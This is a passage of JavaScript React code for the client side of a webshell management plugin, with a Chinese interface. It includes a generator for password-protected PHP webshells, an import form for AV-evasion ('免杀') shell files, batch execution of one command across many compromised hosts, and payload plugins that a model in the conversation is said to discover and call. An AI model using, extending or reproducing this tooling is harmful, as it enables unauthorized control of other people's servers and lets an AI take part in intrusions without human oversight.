							return h("tr", { key: i }, row.map(function (v, j) { return h("td", { key: j, className: "wrap dsh-wsm-mono" }, v === null ? "NULL" : String(v)); }));
						})))),
						result[0].truncated ? h("div", { className: "dsh-wsm-sub" }, "结果截断至前 200 行") : null) : null)) : null,
		h(Popover, { open: !!histMenu[0], anchor: histMenu[0] ? histMenu[0].anchor : null, onClose: function () { histMenu[1](null); }, title: "SQL 历史（本连接）", width: 380 },
			sqlHistory.map(function (s, i) {
				return h("button", { key: i, className: "dsh-wsm-menu-item", onClick: function () { sql[1](s); histMenu[1](null); } },
					h("span", { className: "dsh-wsm-mono", style: { overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: 320, display: "inline-block" } }, s.slice(0, 160)));
			})));
}

//#endregion

//#region 生成器

function GenPane(props) {
	var kinds = useState(null);
	var list = useState(null);
	var draft = useState({ kind: "php-aes2", name: "", password: "", pass_param: "pass", cmd_param: "cmd" });
	var preview = useState(null);
	var msg = useState("");
	var importForm = useState(false);
	useEffect(function () {
		api("gen.action", { action: "kinds" }).then(kinds[1]).catch(function (e) { msg[1](String(e)); });
		api("gen.action", { action: "list" }).then(list[1]).catch(function () { list[1]({ generations: [] }); });
	}, []);
	function set(k, v) { draft[1](function (p) { var n = Object.assign({}, p); n[k] = v; return n; }); }
	function make() {
		msg[1](""); preview[1](null);
		api("gen.action", { action: "make", kind: draft[0].kind, name: draft[0].name, password: draft[0].password, pass_param: draft[0].pass_param, cmd_param: draft[0].cmd_param }).then(function (r) {
			if (r.error) msg[1](r.error);
			else { preview[1](r); api("gen.action", { action: "list" }).then(list[1]); }
		}).catch(function (e) { msg[1](String(e)); });
	}
	var kindRows = kinds[0] && kinds[0].kinds ? Object.entries(kinds[0].kinds) : [];
	return h(React.Fragment, null,
		h("div", { className: "dsh-wsm-row" },
			h(Field, { label: "类型" }, h("select", { className: "dsh-wsm-select", value: draft[0].kind, onChange: function (e) { set("kind", e.target.value); } },
				kindRows.map(function (e) { return h("option", { key: e[0], value: e[0] }, e[1].label); }))),
			h(Field, { label: "名称" }, h("input", { className: "dsh-wsm-input mono", value: draft[0].name, onChange: function (e) { set("name", e.target.value); }, placeholder: "默认类型+时间戳" })),
			h(Field, { label: "口令（留空随机）" }, h("input", { className: "dsh-wsm-input mono", value: draft[0].password, onChange: function (e) { set("password", e.target.value); } })),
			h(Field, { label: "参数名" }, h("input", { className: "dsh-wsm-input mono", value: draft[0].pass_param, onChange: function (e) { set("pass_param", e.target.value); } })),
			h(Btn, { primary: true, onClick: make }, "生成"),
			h(Btn, { onClick: function () { importForm[1](true); } }, "从文件导入")),
		h(Notice, { msg: msg[0], kind: "error" }),
		h(FormModal, {
			key: "import",
			open: importForm[0], title: "从本地文件导入（免杀模式产物登记）", submitLabel: "导入",
			fields: [{ key: "path", label: "本地绝对路径", value: "", placeholder: "/path/to/shell.php" }, { key: "name", label: "登记名", value: "", placeholder: "默认文件名" }],
			onClose: function () { importForm[1](false); },
			onSubmit: function (d) {
				importForm[1](false);
				api("gen.action", { action: "import", path: d.path, name: d.name }).then(function (r) {
					if (r.error) msg[1](r.error);
					else { preview[1](r); api("gen.action", { action: "list" }).then(list[1]); }
				});
			}
		}),
		preview[0] ? h("div", null,
			h(Notice, { msg: "已生成 → " + (preview[0].generation ? preview[0].generation.file_path : ""), kind: "success" }),
			preview[0].connHint ? h(Notice, { msg: preview[0].connHint, kind: "info" }) : null,
			preview[0].password ? h(Notice, { msg: "口令：" + preview[0].password, kind: "info" }) : null,
			h("div", { className: "dsh-wsm-scrollbox" },
				h("pre", { className: "dsh-wsm-mono", style: { background: "var(--dsw-alias-bg-inset,#14161a)", color: "#d5dbe6", padding: 12, margin: 0, overflow: "auto" } }, preview[0].content || ""))) : null,
		list[0] ? h("div", null,
			h("div", { className: "dsh-wsm-sub", style: { marginBottom: 6 } }, "产物登记（generated/）"),
			h("div", { className: "dsh-wsm-scrollbox" },
				h("table", { className: "dsh-wsm-table" },
					h("thead", null, h("tr", null, h("th", null, "名称"), h("th", null, "类型"), h("th", null, "语言"), h("th", null, "路径"), h("th", null, "时间"), h("th", null, ""))),
					h("tbody", null, (list[0].generations || []).map(function (g) {
						return h("tr", { key: g.id },
							h("td", null, g.name),
							h("td", null, g.kind),
							h("td", null, g.lang),
							h("td", { className: "dsh-wsm-mono" }, g.file_path),
							h("td", null, fmtTime(g.created_at)),
							h("td", { style: { textAlign: "right" } },
								h(Btn, { small: true, danger: true, onClick: function () {
									if (!window.confirm("删除登记 " + g.name + "？")) return;
									api("gen.action", { action: "delete", id: g.id }).then(function () { api("gen.action", { action: "list" }).then(list[1]); });
								} }, "删除")));
					}))))) : null);
}

//#endregion

//#region 插件

function PluginsPane(props) {
	var conn = props.conn;
	var plugins = useState(null);
	var running = useState(null);
	useEffect(function () {
		api("plugins.action", { action: "list" }).then(plugins[1]).catch(function (e) { plugins[1]({ plugins: [], error: String(e) }); });
	}, []);
	function run() {
		var r = running[0];
		running[1](Object.assign({}, r, { result: null, msg: "运行中…" }));
		api("plugins.action", { action: "run", name: r.plugin.name, connId: conn.id, params: r.params }).then(function (res) {
			if (res.error) running[1](Object.assign({}, r, { result: null, msg: res.error }));
			else running[1](Object.assign({}, r, { result: res.result, msg: "" }));
		}).catch(function (e) { running[1](Object.assign({}, r, { msg: String(e) })); });
	}
	if (plugins[0] === null) return h("div", { className: "dsh-wsm-sub" }, "读取中…");
	return h(React.Fragment, null,
		h("div", { className: "dsh-wsm-sub" }, "载荷插件（" + plugins[0].dir + " 下新建目录 + plugin.json 即扩展；会话内模型经 webshell_plugin_list 可发现并调用）"),
		h("div", { className: "dsh-wsm-scrollbox" },
			h("table", { className: "dsh-wsm-table" },
				h("thead", null, h("tr", null, h("th", null, "名称"), h("th", null, "类型"), h("th", null, "语言"), h("th", null, "参数"), h("th", null, "来源"), h("th", null, ""))),
				h("tbody", null, (plugins[0].plugins || []).map(function (p) {
					return h("tr", { key: p.name },
						h("td", null, p.name + " v" + p.version),
						h("td", null, p.type),
						h("td", null, (p.langs || []).join("/")),
						h("td", { className: "wrap" }, (p.params || []).map(function (x) { return x.key; }).join(", ") || "—"),
						h("td", null, p.origin),
						h("td", { style: { textAlign: "right" } },
							h(Btn, { small: true, disabled: !conn, onClick: function () {
								var params = {};
								(p.params || []).forEach(function (x) { params[x.key] = x.default || ""; });
								running[1]({ plugin: p, params: params, result: null, msg: "" });
							} }, conn ? "运行" : "选连接后可运行")));
				})))),
		h(Modal, { open: !!running[0], onClose: function () { running[1](null); } },
			running[0] ? h(React.Fragment, null,
				h("h3", null, "运行插件 " + running[0].plugin.name),
				(running[0].plugin.params || []).map(function (x) {
					return h(Field, { key: x.key, label: x.label },
						x.type === "select"
							? h("select", { className: "dsh-wsm-select", value: running[0].params[x.key] ?? "", onChange: function (e) { var n = Object.assign({}, running[0].params); n[x.key] = e.target.value; running[1](Object.assign({}, running[0], { params: n })); } }, (x.options || []).map(function (o) { return h("option", { key: o, value: o }, o); }))
							: h("input", { className: "dsh-wsm-input mono", value: running[0].params[x.key] ?? "", onChange: function (e) { var n = Object.assign({}, running[0].params); n[x.key] = e.target.value; running[1](Object.assign({}, running[0], { params: n })); } }));
				}),
				running[0].msg ? h(Notice, { msg: running[0].msg, kind: "error" }) : null,
				running[0].result ? h("div", { className: "dsh-wsm-scrollbox" },
					h("pre", { className: "dsh-wsm-mono", style: { background: "var(--dsw-alias-bg-inset,#14161a)", color: "#d5dbe6", padding: 12, margin: 0, overflow: "auto" } }, typeof running[0].result === "string" ? running[0].result : JSON.stringify(running[0].result, null, 2))) : null,
				h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
					h(Btn, { onClick: function () { running[1](null); } }, "关闭"),
					h(Btn, { primary: true, onClick: run }, "运行"))) : null));
}

//#endregion

//#region 根视图

var TABS = [
	{ id: "overview", label: "概览" },
	{ id: "files", label: "文件" },
	{ id: "db", label: "数据库" },
	{ id: "terminal", label: "终端" },
	{ id: "gen", label: "生成器" },
	{ id: "plugins", label: "插件" }
];

function WebshellView(props) {
	var conns = useState(null);
	var selected = useState("");
	var tab = useState("overview");
	var railOpen = useState(true);
	var formOpen = useState(false);
	var editing = useState(null);
	var connMenu = useState(null);
	var search = useState("");
	var batchMenu = useState(null);
	var batchSel = useState({});
	var batchCmd = useState("whoami");
	var batchBusy = useState(false);
	var batchResult = useState(null);
	var states = useState({});
	var statesRef = useRef({});
	var persistTimers = useRef({});
	function refresh() {
		api("conn.list").then(function (r) { conns[1](r.connections || []); }).catch(function () { conns[1]([]); });
	}
	useEffect(refresh, []);
	var conn = (conns[0] || []).find(function (c) { return c.id === selected[0]; }) || null;
	var connState = states[0][selected[0]] || {};
	var stateReady = !!states[0][selected[0]]; // 状态未载入前子面板不动——防串目录/串 SQL
	function loadState(id) {
		api("conn.state.get", { id: id }).then(function (r) {
			statesRef.current[id] = r.state || {};
			states[1](function (p) { var n = Object.assign({}, p); n[id] = r.state || {}; return n; });
		}).catch(function () { });
	}
	useEffect(function () { if (selected[0] && !states[0][selected[0]]) loadState(selected[0]); }, [selected[0]]);
	function persistState(patch) {
		var id = selected[0];
		if (!id) return;
		statesRef.current[id] = Object.assign({}, statesRef.current[id] || {}, patch);
		states[1](function (p) { var n = Object.assign({}, p); n[id] = Object.assign({}, p[id] || {}, patch); return n; });
		clearTimeout(persistTimers.current[id]);
		persistTimers.current[id] = setTimeout(function () {
			api("conn.state.set", { id: id, state: statesRef.current[id] || {} });
		}, 600);
	}
	var filtered = (conns[0] || []).filter(function (c) {
		return !search[0] || (c.name + " " + c.url + " " + (c.remark || "")).toLowerCase().includes(search[0].toLowerCase());
	});
	var pane;
	if (tab[0] === "overview") pane = h(OverviewPane, { key: "ov", conn: conn, onRefresh: refresh });
	else if (tab[0] === "files") pane = h(FilesPane, { key: selected[0] || "noconn", conn: conn, connState: connState, stateReady: stateReady, persistState: persistState });
	else if (tab[0] === "db") pane = h(DbPane, { key: selected[0] || "noconn", conn: conn, connState: connState, stateReady: stateReady, persistState: persistState });
	else if (tab[0] === "terminal") pane = h(TerminalPane, { key: selected[0] || "noconn", conn: conn, connState: connState, stateReady: stateReady, persistState: persistState });
	else if (tab[0] === "gen") pane = h(GenPane, {});
	else pane = h(PluginsPane, { conn: conn });
	return h("div", { className: "dsh-wsm-root" },
		h("div", { className: "dsh-wsm-head" },
			h("button", { className: "dsh-wsm-btn is-small", onClick: function () { railOpen[1](!railOpen[0]); }, title: "连接栏开/关" }, railOpen[0] ? "‹" : "›"),
			h("span", { className: "dsh-wsm-title" }, "webshell 管理"),
			conn ? h(Pill, { tone: "accent" }, conn.protocol) : null,
			conn ? h(Pill, null, conn.shell_lang + " / " + conn.os) : null,
			h("span", { className: "dsh-wsm-spacer" }),
			h(Btn, { small: true, onClick: function (e) {
				var r = e.currentTarget.getBoundingClientRect();
				batchMenu[1]({ anchor: { left: r.left, top: r.top, bottom: r.bottom } });
			} }, "批量执行"),
			h(Btn, { small: true, onClick: function () { editing[1](null); formOpen[1](true); } }, "新建连接")),
		batchMenu[0] ? h(Popover, { open: true, anchor: batchMenu[0].anchor, onClose: function () { batchMenu[1](null); batchResult[1](null); }, title: "批量执行（多连接同一命令）", width: 460 },
			h("div", { className: "dsh-wsm-scrollbox", style: { maxHeight: "26vh", marginBottom: 6 } },
				(conns[0] || []).length === 0 ? h("div", { className: "dsh-wsm-sub", style: { padding: 6 } }, "（无连接）") :
				(conns[0] || []).map(function (c) {
					return h("label", { key: c.id, className: "dsh-wsm-menu-item", style: { display: "flex", alignItems: "center", gap: 6 } },
						h("input", { type: "checkbox", checked: !!batchSel[0][c.id], onChange: function (e) {
							batchSel[1](function (p) { var n = Object.assign({}, p); n[c.id] = e.target.checked; return n; });
						} }),
						h("span", { className: "dsh-wsm-mono", style: { flex: 1 } }, (c.name || c.url)),
						h("span", { className: "dsh-wsm-sub" }, c.protocol));
				})),
			h(Field, { label: "命令" }, h("input", { className: "dsh-wsm-input mono", value: batchCmd[0], onChange: function (e) { batchCmd[1](e.target.value); } })),
			h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
				h(Btn, { disabled: batchBusy[0], onClick: function () { batchMenu[1](null); batchResult[1](null); } }, "取消"),
				h(Btn, { primary: true, disabled: batchBusy[0], onClick: function () {
					var ids = Object.keys(batchSel[0]).filter(function (k) { return batchSel[0][k]; });
					if (!ids.length || !batchCmd[0]) return;
					batchBusy[1](true);
					api("conn.batch", { ids: ids, command: batchCmd[0] }).then(function (r) {
						batchBusy[1](false);
						batchResult[1](r.results || []);
					}).catch(function (e) { batchBusy[1](false); alert("批量失败：" + String(e)); });
				} }, batchBusy[0] ? "执行中…" : "执行（" + Object.keys(batchSel[0]).filter(function (k) { return batchSel[0][k]; }).length + "）")),
			batchResult[0] ? h("div", { className: "dsh-wsm-scrollbox", style: { maxHeight: "24vh", marginTop: 6 } },
				h("table", { className: "dsh-wsm-table" },
					h("thead", null, h("tr", null, h("th", null, "连接"), h("th", null, "结果"))),
					h("tbody", null, batchResult[0].map(function (r, i) {
						return h("tr", { key: i },
							h("td", { className: "dsh-wsm-mono" }, r.name || r.id),
							h("td", { className: "wrap dsh-wsm-mono", style: { color: r.ok ? "" : "#e5484d" } }, r.ok ? String(r.output).slice(0, 300) : "失败：" + r.error));
					})))) : null) : null,
		h("div", { className: "dsh-wsm-main" },
			h("div", { className: "dsh-wsm-rail" + (railOpen[0] ? "" : " is-collapsed") },
				h("div", { className: "dsh-wsm-rail-head" },
					h("input", { className: "dsh-wsm-input", style: { flex: 1, minWidth: 60 }, placeholder: "搜索…", value: search[0], onChange: function (e) { search[1](e.target.value); } })),
				h("div", { className: "dsh-wsm-rail-list" },
					filtered.map(function (c) {
						return h("div", { key: c.id, className: "dsh-wsm-conn" + (c.id === selected[0] ? " is-active" : ""), onClick: function () { selected[1](c.id); } },
							h("span", { className: "dsh-wsm-dot" + (c.last_status === "ok" ? " is-ok" : c.last_status === "dead" ? " is-dead" : ""), title: c.last_status }),
							h("span", { className: "n", title: c.url }, c.name || c.url),
							h("button", { className: "dsh-wsm-crumb", onClick: function (e) {
								e.stopPropagation();
								var rect = e.currentTarget.getBoundingClientRect();
								connMenu[1]({ anchor: { left: rect.left, top: rect.top, bottom: rect.bottom, right: rect.right }, conn: c });
							} }, "⋯"));
					}),
					filtered.length === 0 ? h("div", { className: "dsh-wsm-sub", style: { padding: 8 } }, conns[0] === null ? "读取中…" : "（空）") : null)),
			h("div", { className: "dsh-wsm-work" },
				h("div", { className: "dsh-wsm-tabs" },
					TABS.map(function (t) {
						return h("button", { key: t.id, className: "dsh-wsm-tab" + (tab[0] === t.id ? " is-active" : ""), onClick: function () { tab[1](t.id); } }, t.label);
					})),
				h("div", { className: "dsh-wsm-pane" }, pane))),
		h(Popover, { open: !!connMenu[0], anchor: connMenu[0] ? connMenu[0].anchor : null, onClose: function () { connMenu[1](null); }, title: connMenu[0] ? (connMenu[0].conn.name || connMenu[0].conn.url) : "", width: 220 },
			connMenu[0] ? [
				h("button", { key: "edit", className: "dsh-wsm-menu-item", onClick: function () { editing[1](connMenu[0].conn); connMenu[1](null); formOpen[1](true); } }, "编辑…"),
				h("button", { key: "probe", className: "dsh-wsm-menu-item", onClick: function () {
					var c = connMenu[0].conn;
					connMenu[1](null);
					api("conn.probe", { id: c.id }).then(refresh);
				} }, "探活"),
				h("button", { key: "del", className: "dsh-wsm-menu-item is-danger", onClick: function () {
					var c = connMenu[0].conn;
					connMenu[1](null);
					if (window.confirm("删除连接 " + (c.name || c.url) + "？（含其数据库档案；不删目标上的马）")) {
						api("conn.delete", { id: c.id }).then(function () { if (selected[0] === c.id) selected[1](""); refresh(); });
					}
				} }, "删除")
			] : null),
		h(ConnForm, { open: formOpen[0], editing: editing[0], onClose: function () { formOpen[1](false); }, onSaved: function (c) { formOpen[1](false); refresh(); selected[1](c.id); } }));
}

function apply(ctx) {
	ctx.effect(function () { return installStyles(); }, "dsh-webshell-mgr: styles");
	ctx.slots.inject("conversation.view", function () {
		return ctx.slots.register({
			name: "conversation.view",
			id: "webshell-mgr",
			order: 61,
			label: function () { return "webshell 管理"; }
		}, function (props) {
			return h(WebshellView, props);
		});
	});
}

module.exports = { name: "dsh-webshell-mgr-client", inject: ["slots"], apply: apply };
return module.exports; } });
